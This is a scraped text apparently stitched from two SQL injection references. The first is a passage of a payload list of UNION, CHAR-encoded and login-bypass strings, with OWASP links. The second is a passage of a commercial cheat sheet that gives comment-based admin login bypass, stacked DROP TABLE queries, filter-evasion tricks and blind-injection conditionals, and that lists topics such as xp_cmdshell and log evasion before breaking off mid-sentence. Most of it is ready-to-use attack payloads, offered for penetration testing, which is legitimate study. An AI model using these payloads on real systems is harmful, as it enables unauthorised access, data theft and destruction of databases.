SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))# UNION ALL SELECT NULL AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC) AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- UNION ALL SELECT 'INJ'||'ECT'||'XXX' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 'INJ'||'ECT'||'XXX'# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n'-' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' \"-\" \" \" \"&\" \"^\" \"*\" \" or \"\"-\" \" or \"\" \" \" or \"\"&\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' # admin'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 admin\" -- admin\" # admin\"/* admin\" or \"1\"=\"1 admin\" or \"1\"=\"1\"-- admin\" or \"1\"=\"1\"# admin\" or \"1\"=\"1\"/* admin\"or 1=1 or \"\"=\" admin\" or 1=1 admin\" or 1=1-- admin\" or 1=1# admin\" or 1=1/* admin\") or (\"1\"=\"1 admin\") or (\"1\"=\"1\"-- admin\") or (\"1\"=\"1\"# admin\") or (\"1\"=\"1\"/* admin\") or \"1\"=\"1 admin\") or \"1\"=\"1\"-- admin\") or \"1\"=\"1\"# admin\") or \"1\"=\"1\"/* 1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\n'-' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' \"-\" \" \" \"&\" \"^\" \"*\" \" or \"\"-\" \" or \"\" \" \" or \"\"&\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' # admin'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 admin\" -- admin\" # admin\"/* admin\" or \"1\"=\"1 admin\" or \"1\"=\"1\"-- admin\" or \"1\"=\"1\"# admin\" or \"1\"=\"1\"/* admin\"or 1=1 or \"\"=\" admin\" or 1=1 admin\" or 1=1-- admin\" or 1=1# admin\" or 1=1/* admin\") or (\"1\"=\"1 admin\") or (\"1\"=\"1\"-- admin\") or (\"1\"=\"1\"# admin\") or (\"1\"=\"1\"/* admin\") or \"1\"=\"1 admin\") or \"1\"=\"1\"-- admin\") or \"1\"=\"1\"# admin\") or \"1\"=\"1\"/* 1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\n👉 https://www.owasp.org/index.php/SQL_Injection\n👉 https://www.owasp.org/index.php/Blind_SQL_Injection\nTesting for SQL Injection (OTG-INPVAL-005)\n👉 https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)\n👉 https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF\nReviewing Code for SQL Injection\n👉 https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection\n👉 https://www.owasp.org/index.php/PL/SQL:SQL_Injection\n👉 https://www.owasp.org/index.php/Testing_for_NoSQL_injection\nSQL Injection Injection Prevention Cheat Sheet\n👉 https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\nSQL Injection Query Parameterization Cheat Sheet\n👉 https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html",
    "source": "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/refs/heads/master/README.md",
    "metadata": {
      "title": "PayloadBox SQLi List"
    }
  },
  {
    "content": "Product Web Application Security API Security Features DAST SAST SCA Container Security\nWhy Us? Solutions Industries IT & Telecom Government Financial Services Education Healthcare Roles CTO & CISO Engineering Manager Security Engineer DevSecOps Comparison Case studies Customers Testimonials\nSolutions Industries IT & Telecom Government Financial Services Education Healthcare Roles CTO & CISO Engineering Manager Security Engineer DevSecOps\nIndustries IT & Telecom Government Financial Services Education Healthcare\nRoles CTO & CISO Engineering Manager Security Engineer DevSecOps\nAbout Us Our Story In the news Careers Contact us\nResources Blog Live Trainings Podcasts Invicti Learn Resource Library Partners Channel MSSP Documentation\nUse the Invicti SQL Injection Cheat Sheet to learn about exploiting different variants of the SQL injection vulnerability. The cheat sheet includes technical information and payloads for SQL injection attacks against MySQL, Microsoft SQL Server, Oracle and PostgreSQL database servers.\nYour Information will be kept private .\nBegin your DAST-first AppSec journey today.\nWhat is an SQL injection cheat sheet?\nThis SQL injection cheat sheet is a cybersecurity resource with detailed technical information and attack payloads to test for different types of SQL injection (SQLi) vulnerabilities caused by insufficient user input validation and sanitization. This cheat sheet can be used as a reference for penetration testers but also as a general guide for anyone interested in web application security and all the unexpected things you can do with SQL commands.\nAbout the Invicti SQL injection cheat sheet\nThis cheat sheet has been the web’s leading reference for SQL injection payloads ever since it was first published in 2015 on Netsparker. It is a living document in constant development and currently contains payloads and tips for MySQL, Microsoft SQL Server, Oracle, PostgreSQL, and SQLite. As with any cheat sheet, some examples might not work in every situation because injection in real live environments will vary depending on the server configuration, structured query language dialect, usage of parentheses, application framework, and unexpected, strange, and complex SQL statements.\nSuccessful SQL injection often requires a payload tailored to a specific SQL database system. Payload usability is indicated as follows:\n+ = works on potentially other databases\nWhen a payloads works on several database systems, you will see multiple symbols:\n(MS) = works on MySQL and SQL Server\n(PO+) = works on PostgreSQL, Oracle, and possibly other databases\nAutomatically finding and exploiting SQL injection vulnerabilities with DAST\nThis cheat sheet lists dozens of SQLi payloads and techniques but still only scratches the surface. Different types of attacks, SQL code variants, encoding options, values to try out to bypass filters—there’s no way anyone could cover all the combinations manually, which makes DAST tools (web vulnerability scanners) a vital part of any offensive or defensive application security toolbox.\nDAST solutions such as Invicti and Acunetix by Invicti can quickly and automatically test hundreds of SQLi attack variations with unique payload values to be sure that a specific application reaction indicates a true vulnerability. Covering in-band, out-of-band, and even boolean SQL injections, Invicti DAST tools not only identify vulnerabilities but can safely exploit many of them and present a proof of exploit.\nLearn how Invicti’s proof-based scanning works and get a demo to see it in action!\nSQL injection 101: Injecting comments to manipulate queries Line comments Inline comments Classic inline comment SQL injection attack samples MySQL version detection sample attacks\nInline comments Classic inline comment SQL injection attack samples MySQL version detection sample attacks\nClassic inline comment SQL injection attack samples\nMySQL version detection sample attacks\nStacking queries Stacked SQL injection attack samples\nStacked SQL injection attack samples\nIf statements MySQL If statement SQL Server If statement Oracle If statement PostgreSQL If statement SQLite If statement If statement SQL injection attack samples\nIf statement SQL injection attack samples\nString operations String concatenation Strings without quotes String from a hex representation Using string functions Hex-based SQL injection example String utility functions\nStrings without quotes String from a hex representation Using string functions Hex-based SQL injection example\nString from a hex representation\nHex-based SQL injection example\nUnion injections Dealing with language issues in UNION injections Bypassing login screens Bypassing login screens that use hashed passwords Example of bypassing an MD5 hash check\nDealing with language issues in UNION injections\nBypassing login screens that use hashed passwords Example of bypassing an MD5 hash check\nExample of bypassing an MD5 hash check\nError-based ways to discover column information Finding column names using HAVING and GROUP BY (error-based) Finding the number of columns in a SELECT query using ORDER BY Tips and tricks for error-based UNION injections Ways of finding the column type\nFinding column names using HAVING and GROUP BY (error-based)\nFinding the number of columns in a SELECT query using ORDER BY\nTips and tricks for error-based UNION injections\nWays of finding the column type\nSQL Server utilities The bcp (Bulk Copy Program) utility Using VBS and WSH scripting\nThe bcp (Bulk Copy Program) utility\nSQL Server stored procedures Executing system commands using xp_cmdshell Enabling xp_cmdshell in SQL Server 2005 Performing registry operations in SQL Server Other useful stored procedures for SQL Server Useful system views in SQL Server Handy techniques for further MSSQL exploitation SQL injection into LIMIT or ORDER Shut down SQL Server\nExecuting system commands using xp_cmdshell\nEnabling xp_cmdshell in SQL Server 2005\nPerforming registry operations in SQL Server\nOther useful stored procedures for SQL Server\nUseful system views in SQL Server\nHandy techniques for further MSSQL exploitation\nSQL injection into LIMIT or ORDER\nFinding and manipulating the database structure in SQL Server Getting user-defined tables Getting column names Moving records\nError-based SQL injections in SQL Server: A fast way to extract data\nFinding the database structure in MySQL Getting user-defined tables Getting column names\nBlind SQL injections Real-life example of an automatable blind SQL injection attack Ways of making databases wait or sleep for blind SQL injection attacks WAITFOR DELAY BENCHMARK() pg_sleep() sleep() dbms_pipe.receive_message()\nReal-life example of an automatable blind SQL injection attack\nWays of making databases wait or sleep for blind SQL injection attacks WAITFOR DELAY BENCHMARK() pg_sleep() sleep() dbms_pipe.receive_message()\nHow SQL injection attacks can be hidden from logs SQL Server log bypass using sp_password\nSQL Server log bypass using sp_password\nTests to check if SQL injection is possible\nTips and tricks for working with MySQL Useful MySQL functions\nForcing SQL Server to get NTLM hashes Bulk insert from a UNC share\nOut-of-band channel attacks Out-of-band injections for SQL Server Out-of-band injections for MySQL on Windows Out-of-band injections for Oracle\nOut-of-band injections for SQL Server\nOut-of-band injections for MySQL on Windows\nOut-of-band injections for Oracle\nSQL injection 101: Injecting comments to manipulate queries\nPut a line comment at the end to comment out the rest of the query. Line comments are typically used to ignore the rest of the original query so you don’t need to worry about ensuring valid syntax after the injection point.\nA common example is logging in as admin:\nInjection into the username parameter with a single quote: admin'--\nSELECT * FROM members WHERE username = ' admin'-- ' AND password = 'password' If successful, this will log you as the admin user because the rest of the SQL query after -- will be ignored.\nSELECT * FROM members WHERE username = ' admin'-- ' AND password = 'password'\nYou can use inline comments to comment out the rest of a query as with line comments (by simply not closing the comment). They are also useful for manipulating characters to bypass filtering/blacklisting, remove spaces, and obfuscate queries. In MySQL, you can use its special comment syntax to detect the database and version.\nTypical uses of inline comments:\nObfuscation: DROP/*comment*/sampletable\nBreaking up a keyword to avoid filters: DR/**/OP/*bypass blacklisting*/sampletable\nDR/**/OP/*bypass blacklisting*/sampletable\nRemoving space characters: SELECT/*avoid-spaces*/password/**/FROM/**/Members\nSELECT/*avoid-spaces*/password/**/FROM/**/Members\nFor MySQL only, you can use special comment syntax:\n/*! MYSQL special comment format */ (M)\n/*! MYSQL special comment format */\nThis special comment syntax is perfect for detecting that MySQL is being used because any instructions you put in this comment will only execute in MySQL. You can even use this to detect the version. The following example will execute and generate an error only is the server uses MySQL in the specified version or later:\nSELECT /*! 80027 1/0, */ 1 FROM tablename\nSELECT /*! 80027 1/0, */ 1 FROM tablename\nSELECT /*! 80027 1/0, */ 1 FROM tablename\nID value: 10; DROP TABLE members /* Simply get rid of other stuff at the end the of query. Same as 10; DROP TABLE members --\nSELECT /*! 80027 1/0, */ 1 FROM tablename Will throw an division by 0 error if MySQL version is higher than 8.0.27\nSELECT /*! 80027 1/0, */ 1 FROM tablename\nID value: 10 You will get the same response if MySQL version is higher than 8.0.27\nSELECT /*! 80027 1/0, */ 1 FROM tablename Will throw a division by 0 error if MySQL version is higher than 8.0.27\nSELECT /*! 80027 1/0, */ 1 FROM tablename\nStacking means executing more than one query in one transaction. This technique can be very useful but only works for some combinations of database server and access method:\n; (MSP) SELECT * FROM members; DROP members--\nSELECT * FROM members; DROP members--\nWhen successful, this will end one query and start another one.\nNote that results from the second query (and any additional queries) are not returned to the application. You need to use blind SQL injection methods to confirm that the second query is working, such as a delay, DNS query, etc.\nStacked SQL injection attack samples\nSELECT * FROM products WHERE id = 10; DROP members--\nSELECT * FROM products WHERE id = 10; DROP members--\nThis will run DROP members SQL sentence after normal SQL Query.\nGet response based on an IF statement. This is one of the key techniques for Blind SQL Injection. Also very useful to test simpler things blindly yet accurately.\nIF( condition , true-part , false-part ) (M) SELECT IF(1=1,'true','false')\nIF( condition , true-part , false-part )\nIF condition true-part ELSE false-part (S) IF (1=1) SELECT 'true' ELSE SELECT 'false'\nIF condition true-part ELSE false-part\nIF (1=1) SELECT 'true' ELSE SELECT 'false'\nBEGIN IF condition THEN true-part ; ELSE false-part ; END IF; END; (O) IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;\nBEGIN IF condition THEN true-part ; ELSE false-part ; END IF; END;\nIF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;\nSELECT CASE WHEN condition THEN true-part ELSE false-part END; (P) SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END;\nSELECT CASE WHEN condition THEN true-part ELSE false-part END;\nSELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END;\niif( condition , true-part , false-part ) (L) SELECT iif(1<2, \"True\", \"False\");\niif( condition , true-part , false-part )\nSELECT iif(1<2, \"True\", \"False\");\nIf statement SQL injection attack samples\nif ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0 (S) This will throw a divide by zero error if the user currently logged in is not sa or dbo .\nif ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0\nVery useful for bypassing magic_quotes() and similar filtering/escaping techniques, including web application firewall (WAF) filters.\nYou can use hex values in queries like this:\nSELECT 0x5045 (M) ( this is not an integer but a string based on the hex value… )\nSELECT 0x50 + 0x45 (M) ( … but this is now an integer! ) You can use this technique in comparisons, for example: ' OR 0x20 + 0x10 = 0x30 -- -\nString-related operations can be useful for building up injections that do not use any quotes, bypassing blacklisting, or determining the type of back-end database.\n+ (S) SELECT login + '-' + password FROM members\nSELECT login + '-' + password FROM members\n|| (*MO) SELECT login || '-' || password FROM members\nSELECT login || '-' || password FROM members\nNote that for MySQL, the above example will only work if MySQL is running in ANSI mode . Otherwise, MySQL will treat || as a logical operator and return 0. A better way it to use the CONCAT() function in 